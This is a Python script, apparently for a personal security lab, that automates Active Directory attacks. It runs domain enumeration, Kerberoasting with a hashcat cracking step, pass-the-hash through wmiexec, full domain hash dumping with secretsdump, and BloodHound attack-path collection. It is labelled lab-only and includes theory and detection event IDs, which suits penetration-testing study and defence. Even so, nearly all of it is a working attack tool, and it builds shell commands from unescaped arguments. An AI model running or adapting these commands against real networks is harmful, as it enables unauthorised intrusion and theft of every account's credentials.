#!/usr/bin/env python3
"""
AD Attack Lab — Active Directory Attack Simulation Scripts
Author: Tobi Bolaji (@hijay166)

Scripts to demonstrate common AD attack techniques in a LAB environment.
Run ONLY against your own lab. Never against production systems.
"""

import subprocess
import argparse
import sys
import os
from datetime import datetime

BANNER = """
╔══════════════════════════════════════════════════════════╗
║         AD Attack Lab — Tobi Bolaji (@hijay166)         ║
║         For authorised lab use ONLY                     ║
╚══════════════════════════════════════════════════════════╝
"""

def run(cmd, label=""):
    """Run a shell command and return output."""
    print(f"\n[*] {label}")
    print(f"    CMD: {cmd}")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        if result.stdout:
            print(result.stdout)
        if result.stderr and result.returncode != 0:
            print(f"[!] STDERR: {result.stderr[:300]}")
        return result.stdout
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
        return ""
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""


# ── Module 1: Enumeration ────────────────────────────────────────────────────

def enumerate_domain(dc_ip, domain, username, password):
    """Basic AD enumeration using enum4linux and rpcclient."""
    print("\n" + "="*60)
    print("  MODULE 1: Domain Enumeration")
    print("="*60)

    run(f"nmap -sV -p 88,135,139,389,445,636,3268,3269 {dc_ip}",
        "Port scan — AD services")

    run(f"enum4linux -a -u '{username}' -p '{password}' {dc_ip}",
        "Enum4linux full enumeration")

    run(f"rpcclient -U '{domain}\\{username}%{password}' {dc_ip} -c 'enumdomusers'",
        "RPC — enumerate domain users")

    run(f"rpcclient -U '{domain}\\{username}%{password}' {dc_ip} -c 'enumdomgroups'",
        "RPC — enumerate domain groups")

    run(f"ldapsearch -x -H ldap://{dc_ip} -D '{username}@{domain}' -w '{password}' "
        f"-b 'DC={domain.split(\".\")[0]},DC={domain.split(\".\")[1]}' '(objectClass=user)' sAMAccountName",
        "LDAP — dump user accounts")


# ── Module 2: Kerberoasting ──────────────────────────────────────────────────

def kerberoast(dc_ip, domain, username, password, output_file="kerberoast_hashes.txt"):
    """
    Kerberoasting — request TGS tickets for SPN accounts and extract hashes.
    Requires: impacket (GetUserSPNs.py)
    """
    print("\n" + "="*60)
    print("  MODULE 2: Kerberoasting")
    print("="*60)

    print("""
[*] Theory:
    Kerberoasting targets service accounts with SPNs (Service Principal Names).
    Any domain user can request a TGS (Ticket Granting Service) ticket for any SPN.
    The TGS is encrypted with the service account's NTLM hash — crackable offline.

[*] Detection: Event ID 4769 — Kerberos Service Ticket Operation
""")

    run(f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request "
        f"-outputfile {output_file}",
        "Impacket GetUserSPNs — extract Kerberoastable hashes")

    if os.path.exists(output_file):
        print(f"\n[+] Hashes saved to {output_file}")
        print("[*] Crack with: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt")
    else:
        print(f"[!] Output file not found — check Impacket is installed")
        print("    Install: pip install impacket")


# ── Module 3: Pass-the-Hash ──────────────────────────────────────────────────

def pass_the_hash(target_ip, domain, username, ntlm_hash):
    """
    Pass-the-Hash (PtH) — authenticate using an NTLM hash without the plaintext password.
    Requires: impacket (psexec.py / wmiexec.py)
    """
    print("\n" + "="*60)
    print("  MODULE 3: Pass-the-Hash")
    print("="*60)

    print("""
[*] Theory:
    Windows NTLM authentication accepts the hash directly — no plaintext needed.
    If you dump an NTLM hash from memory (via Mimikatz/secretsdump), you can
    authenticate as that user on any system where the account is valid.

[*] Detection: Event ID 4624 Logon Type 3 from unexpected hosts
""")

    print(f"[*] Attempting PtH with {domain}\\{username} against {target_ip}")
    run(f"wmiexec.py -hashes ':{ntlm_hash}' {domain}/{username}@{target_ip} 'whoami /all'",
        "Impacket WMIexec — Pass-the-Hash")


# ── Module 4: Credential Dumping ─────────────────────────────────────────────

def dump_credentials(dc_ip, domain, username, password):
    """
    Dump credentials from the DC using secretsdump (requires Domain Admin).
    """
    print("\n" + "="*60)
    print("  MODULE 4: Credential Dumping (secretsdump)")
    print("="*60)

    print("""
[*] Theory:
    With Domain Admin privileges, secretsdump.py connects to the DC and
    extracts all NTLM hashes from the NTDS.dit database (AD credential store).
    This gives you hashes for every domain account.

[*] Detection: Event ID 4662 — Directory Service Access
""")

    run(f"secretsdump.py {domain}/{username}:{password}@{dc_ip}",
        "Impacket secretsdump — dump all domain hashes")


# ── Module 5: BloodHound Collection ──────────────────────────────────────────

def run_bloodhound(dc_ip, domain, username, password):
    """
    Collect BloodHound data using BloodHound.py (Python ingestor).
    """
    print("\n" + "="*60)
    print("  MODULE 5: BloodHound Data Collection")
    print("="*60)

    print("""
[*] Theory:
    BloodHound maps AD relationships to find attack paths to Domain Admin.
    It collects: users, groups, computers, GPOs, ACLs, sessions, and trusts.
    The GUI then shows shortest paths and high-value targets.

[*] Detection: LDAP queries from unexpected hosts, unusual Kerberos ticket requests
""")

    run(f"bloodhound-python -u {username} -p '{password}' -d {domain} "
        f"-dc {dc_ip} -c All --zip",
        "BloodHound.py — collect all AD data")

    print("\n[*] Next steps:")
    print("    1. Start Neo4j: sudo neo4j start")
    print("    2. Open BloodHound GUI")
    print("    3. Upload the ZIP file")
    print("    4. Run 'Shortest Paths to Domain Admin'")


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="AD Attack Lab — Active Directory attack simulation (lab use only)"
    )
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP")
    parser.add_argument("--domain", required=True, help="Domain name (e.g. lab.local)")
    parser.add_argument("--username", required=True, help="Domain username")
    parser.add_argument("--password", required=True, help="Domain password")
    parser.add_argument("--module", choices=["enum", "kerberoast", "pth", "dump", "bloodhound", "all"],
                        default="all", help="Module to run")
    parser.add_argument("--target-ip", help="Target IP for Pass-the-Hash")
    parser.add_argument("--hash", help="NTLM hash for Pass-the-Hash")
    args = parser.parse_args()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[*] AD Attack Lab started: {timestamp}")
    print(f"[*] Target DC : {args.dc_ip}")
    print(f"[*] Domain    : {args.domain}")
    print(f"[*] User      : {args.username}\n")

    if args.module in ("enum", "all"):
        enumerate_domain(args.dc_ip, args.domain, args.username, args.password)

    if args.module in ("kerberoast", "all"):
        kerberoast(args.dc_ip, args.domain, args.username, args.password)

    if args.module in ("pth", "all") and args.target_ip and args.hash:
        pass_the_hash(args.target_ip, args.domain, args.username, args.hash)

    if args.module in ("dump", "all"):
        dump_credentials(args.dc_ip, args.domain, args.username, args.password)

    if args.module in ("bloodhound", "all"):
        run_bloodhound(args.dc_ip, args.domain, args.username, args.password)

    print("\n[+] Lab session complete.")


if __name__ == "__main__":
    main()
